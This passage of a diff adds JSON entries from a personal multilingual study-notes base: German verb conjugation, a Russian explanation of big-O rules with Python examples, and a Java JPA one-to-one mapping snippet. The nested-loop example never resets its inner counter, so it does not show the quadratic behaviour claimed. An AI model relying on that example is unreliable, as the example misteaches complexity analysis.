**-et** через вимову |\n\n---\n\n### Як доповнити таблицю?\n\nЩоб додати нове дієслово:\n1. Дотримуйтесь формату таблиці.\n2. Вкажіть переклад, форми Präsens, Präteritum, і Partizip II.\n3. Додайте коротку примітку в колонку \"Особливості\".\n\n### Приклад:\n\nДодайте, наприклад, **wandern** (мандрівля):\n\n```markdown\n| **wandern**  | мандрувати         | ich **wandere**     | ich **wanderte**      | ich bin **gewandert**    | Використовується з **sein** |",
+      "category": "other",
+      "tags": [
+        "слабкі",
+        "дієслово",
+        "starke",
+        "werbung",
+        "verben"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 103324
+    },
+    {
+      "id": "сложность оценки алгоритмов",
+      "title": "сложность оценки алгоритмов",
+      "content": "﻿\n1   -----------\n2   Связи: коллекции \n3   Теги:\n\n\nКамянецкий. Избранное, [1/13/23 1:57 AM]\n🔶 Пять столпов асимптотической оценки сложности простых алгоритмов\n\nЕсть базовые правила того, как подходить к оценке сложности используя нотацию О-большое.\n\nСуществуют пять основных правил для расчета асимптотической сложности алгоритма:\n\n1️⃣ Если для некоторой математической функции 𝑓 алгоритму необходимо выполнить 𝑓(𝑁) действий, то это означает, что алгоритму потребуется сделать 𝑂(𝑓(𝑁)) шагов.\n\nПример\ndef search_max_item(li: list) -> int:\n  index: int = 0\n  max_item: int = li[index]\n  size: int = len(li)\n  \n  while index < size:\n    if li[index] > max_item:\n      max_item = li[index]\n    index += 1\n\n  return max_item\n\nЗаметка: алгоритм проверяет каждый из 𝑁 элементов набора чисел всего один раз, поэтому потребуется 𝑂(𝑁) шагов.\n\n2️⃣ Если алгоритм выполняет одно действие, состоящее из 𝑂(𝑓(𝑁)) шагов, а затем вторую, включающую 𝑂(𝑔(𝑁)) шагов, то для функций 𝑓 и 𝑔 потребуется 𝑂(𝑓(𝑁) + 𝑔(𝑁)) шагов.\n\nПример\ndef search_max_item(li: list) -> int:\n  index: int = 0 # 𝑂(1)\n  max_item: int = li[index] # 𝑂(1)\n  n: int = len(li) # 𝑂(1)\n  \n  while index < n: # 𝑂(N)\n    if li[index] > max_item: #\n      max_item = li[index]   #\n    index += 1               #\n    \n  return max_item  # 𝑂(1)\n\nЗаметка: алгоритм выполняет три шага перед циклом и ещё один после него. Каждый из них имеет производительность 𝑂(1) (договоримся, считать это однократным действием), поэтому общее количество шагов составит 𝑂(3 + 𝑁 + 1), то есть 𝑂(4 + 𝑁).\n\n3️⃣ Если алгоритму необходимо сделать 𝑂(𝑓(𝑁) + 𝑔(𝑁)) шагов, и область допустимых значений 𝑁 функции 𝑓(𝑁) больше, чем у функции 𝑔(𝑁), то можно упростить выражение до 𝑂(𝑓(𝑁)).\n\nЗаметка: В функции search_max_item мы выяснили, что всего будет выполнено 𝑂(4+𝑁) действий. Если параметр 𝑁 начнёт возрастать, его значение превысит постоянную величину 4, а значит выражение можно упростить до 𝑂(𝑁).\n\n4️⃣ Если алгоритму внутри каждого действия 𝑂(𝑓(𝑁)) одной операции требуется выполнять ещё 𝑂(𝑔(𝑁)) действий другой операции, то можно утверждать, что в общем алгоритм выполнит 𝑂(𝑓(𝑁) × 𝑔(𝑁)) действий.\n\nПример\ndef repetition_elements(li: list) -> bool:\n  i: int = 0\n  j: int = 0\n  n: int = len(li)\n\n  while i < n:\n    while j < n:\n      if i != j and li[i] == li[j]:\n        return True\n      j+=1\n    i += 1\n  return False\n\nЗаметка: в примере есть два цикла зависящих от 𝑁. Один вложен в другой. Внешний цикл перебирает все элементы массива, выполняя 𝑂(𝑁) итераций. На каждой итерации внутренний цикл повторно пересматривает все элементы, совершая 𝑂(𝑁) действий. Следовательно, общая производительность алгоритма составит 𝑂(𝑁×𝑁) = 𝑂(𝑁²).\n\n5️⃣ Константами можно пренебречь. Если C является константой, то 𝑂(C × 𝑓(𝑁)) или 𝑂(𝑓(C × 𝑁)) можно упростить до выражения 𝑂(𝑓(𝑁)).\n\nЗаметка: В алгоритме выше блок проверка if, на самом-то деле проверяет два условия, а значит и общее количество действий внутреннего цикла получается не О(𝑁), a О(2 × 𝑁), тогда общая производительность 𝑂(2 × 𝑁²). Предположим, что значение 𝑁 увеличится в три раз, т е вместо 𝑁 будет 3 × 𝑁, тогда О(𝑁) и О(2 × 𝑁) превратится в О(3 × 𝑁) и О(2 × 3 × 𝑁), а общее количество действий 𝑂(3 × 𝑁) × О(2 × 3 × 𝑁) = 𝑂((3 × 𝑁) × (2 × 3 × 𝑁)) = 𝑂(18 × 𝑁²), но 18 × 𝑁² = 9 × 2 × 𝑁² = 3² × 2 × 𝑁² = 2 × (3 × 𝑁)². Получается, что при увеличении объёма входных данных, количество действий увеличится в девять раз (обратное тоже верно, при уменьшении выборки алгоритм ускорится). Обратите внимание, увеличение выборки в 3 раза привело к росту общего количества действий 3², таким образом нас волнует не константа, а закон, по которому количество действий зависит от объёма данных — он тут 𝑁².\n\nВИДЕО НА 6+ часов с полным разбором + математика\n\n (https://t.me/iksergeyru/119)#[[Алгоритмы]] #python\n\nКамянецкий. Избранное, [1/15/23 3:40 PM]\nНапоминаю, что продолжение через двадцать минут\n\nМатериал сложный\nПервая часть была вчера\n\nКамянецкий. Избранное, [1/16/23 10:15 PM]\n🥲 Программистам скоро не будет работы! Их заменит ChatGPT и OpenAI…\n\nзайти на кусок сайта\nhttps://t.me/iksergeyru/119",
+      "full_content": "﻿\n1   -----------\n2   Связи: коллекции \n3   Теги:\n\n\nКамянецкий. Избранное, [1/13/23 1:57 AM]\n🔶 Пять столпов асимптотической оценки сложности простых алгоритмов\n\nЕсть базовые правила того, как подходить к оценке сложности используя нотацию О-большое.\n\nСуществуют пять основных правил для расчета асимптотической сложности алгоритма:\n\n1️⃣ Если для некоторой математической функции 𝑓 алгоритму необходимо выполнить 𝑓(𝑁) действий, то это означает, что алгоритму потребуется сделать 𝑂(𝑓(𝑁)) шагов.\n\nПример\ndef search_max_item(li: list) -> int:\n  index: int = 0\n  max_item: int = li[index]\n  size: int = len(li)\n  \n  while index < size:\n    if li[index] > max_item:\n      max_item = li[index]\n    index += 1\n\n  return max_item\n\nЗаметка: алгоритм проверяет каждый из 𝑁 элементов набора чисел всего один раз, поэтому потребуется 𝑂(𝑁) шагов.\n\n2️⃣ Если алгоритм выполняет одно действие, состоящее из 𝑂(𝑓(𝑁)) шагов, а затем вторую, включающую 𝑂(𝑔(𝑁)) шагов, то для функций 𝑓 и 𝑔 потребуется 𝑂(𝑓(𝑁) + 𝑔(𝑁)) шагов.\n\nПример\ndef search_max_item(li: list) -> int:\n  index: int = 0 # 𝑂(1)\n  max_item: int = li[index] # 𝑂(1)\n  n: int = len(li) # 𝑂(1)\n  \n  while index < n: # 𝑂(N)\n    if li[index] > max_item: #\n      max_item = li[index]   #\n    index += 1               #\n    \n  return max_item  # 𝑂(1)\n\nЗаметка: алгоритм выполняет три шага перед циклом и ещё один после него. Каждый из них имеет производительность 𝑂(1) (договоримся, считать это однократным действием), поэтому общее количество шагов составит 𝑂(3 + 𝑁 + 1), то есть 𝑂(4 + 𝑁).\n\n3️⃣ Если алгоритму необходимо сделать 𝑂(𝑓(𝑁) + 𝑔(𝑁)) шагов, и область допустимых значений 𝑁 функции 𝑓(𝑁) больше, чем у функции 𝑔(𝑁), то можно упростить выражение до 𝑂(𝑓(𝑁)).\n\nЗаметка: В функции search_max_item мы выяснили, что всего будет выполнено 𝑂(4+𝑁) действий. Если параметр 𝑁 начнёт возрастать, его значение превысит постоянную величину 4, а значит выражение можно упростить до 𝑂(𝑁).\n\n4️⃣ Если алгоритму внутри каждого действия 𝑂(𝑓(𝑁)) одной операции требуется выполнять ещё 𝑂(𝑔(𝑁)) действий другой операции, то можно утверждать, что в общем алгоритм выполнит 𝑂(𝑓(𝑁) × 𝑔(𝑁)) действий.\n\nПример\ndef repetition_elements(li: list) -> bool:\n  i: int = 0\n  j: int = 0\n  n: int = len(li)\n\n  while i < n:\n    while j < n:\n      if i != j and li[i] == li[j]:\n        return True\n      j+=1\n    i += 1\n  return False\n\nЗаметка: в примере есть два цикла зависящих от 𝑁. Один вложен в другой. Внешний цикл перебирает все элементы массива, выполняя 𝑂(𝑁) итераций. На каждой итерации внутренний цикл повторно пересматривает все элементы, совершая 𝑂(𝑁) действий. Следовательно, общая производительность алгоритма составит 𝑂(𝑁×𝑁) = 𝑂(𝑁²).\n\n5️⃣ Константами можно пренебречь. Если C является константой, то 𝑂(C × 𝑓(𝑁)) или 𝑂(𝑓(C × 𝑁)) можно упростить до выражения 𝑂(𝑓(𝑁)).\n\nЗаметка: В алгоритме выше блок проверка if, на самом-то деле проверяет два условия, а значит и общее количество действий внутреннего цикла получается не О(𝑁), a О(2 × 𝑁), тогда общая производительность 𝑂(2 × 𝑁²). Предположим, что значение 𝑁 увеличится в три раз, т е вместо 𝑁 будет 3 × 𝑁, тогда О(𝑁) и О(2 × 𝑁) превратится в О(3 × 𝑁) и О(2 × 3 × 𝑁), а общее количество действий 𝑂(3 × 𝑁) × О(2 × 3 × 𝑁) = 𝑂((3 × 𝑁) × (2 × 3 × 𝑁)) = 𝑂(18 × 𝑁²), но 18 × 𝑁² = 9 × 2 × 𝑁² = 3² × 2 × 𝑁² = 2 × (3 × 𝑁)². Получается, что при увеличении объёма входных данных, количество действий увеличится в девять раз (обратное тоже верно, при уменьшении выборки алгоритм ускорится). Обратите внимание, увеличение выборки в 3 раза привело к росту общего количества действий 3², таким образом нас волнует не константа, а закон, по которому количество действий зависит от объёма данных — он тут 𝑁².\n\nВИДЕО НА 6+ часов с полным разбором + математика\n\n (https://t.me/iksergeyru/119)#[[Алгоритмы]] #python\n\nКамянецкий. Избранное, [1/15/23 3:40 PM]\nНапоминаю, что продолжение через двадцать минут\n\nМатериал сложный\nПервая часть была вчера\n\nКамянецкий. Избранное, [1/16/23 10:15 PM]\n🥲 Программистам скоро не будет работы! Их заменит ChatGPT и OpenAI…\n\nзайти на кусок сайта\nhttps://t.me/iksergeyru/119",
+      "category": "other",
+      "tags": [
+        "используя",
+        "сложности",
+        "избранное",
+        "есть",
+        "базовые"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 248425
+    },
+    {
+      "id": "создание связей",
+      "title": "создание связей",
+      "content": "1   -----------\n2   Связи:[[подключение баз данных]] \n3   Теги:  [[создание связей]]\n\n## связь один к одному\n  код в классе Cart\n  @OneToOne  \n@JoinColumn(name = \"UserID\", referencedColumnName = \"**userID**\")  \nprivate Users user;\n\nкод в классе Users\n@OneToOne(mappedBy = \"user\", cascade = CascadeType.ALL)  \nprivate Cart cart;\n\n1. поле **userID** в классе Cart связывается с полем **userID** первичного ключа класса Users\n2. поле user в классе Users связывается с полем card",
+      "full_content": "1   -----------\n2   Связи:[[подключение баз данных]] \n3   Теги:  [[создание связей]]\n\n## связь один к одному\n  код в классе Cart\n  @OneToOne  \n@JoinColumn(name = \"UserID\", referencedColumnName = \"**userID**\")  \nprivate Users user;\n\nкод в классе Users\n@OneToOne(mappedBy = \"user\", cascade = CascadeType.ALL)  \nprivate Cart cart;\n\n1. поле **userID** в классе Cart связывается с полем **userID** первичного ключа класса Users\n2. поле user в классе Users связывается с полем card",
+      "category": "other",
+      "tags": [
+        "private",
+        "onetoone",
+        "подключение",
+        "cart",
+        "users"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 58449
+    },
+    {
+      "id": "створення контенту",
+      "title": "створення контенту",
+      "content": "﻿1   -----------\n2   Связи: [[створення героя ]],  \n3   Теги:",
+      "full_content": "﻿1   -----------\n2   Связи: [[створення героя ]],  \n3   Теги:",
+      "category": "other",
+      "tags": [
+        "теги",
+        "героя",
+        "связи",
+        "створення"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 91809
+    }
+  ]
+}
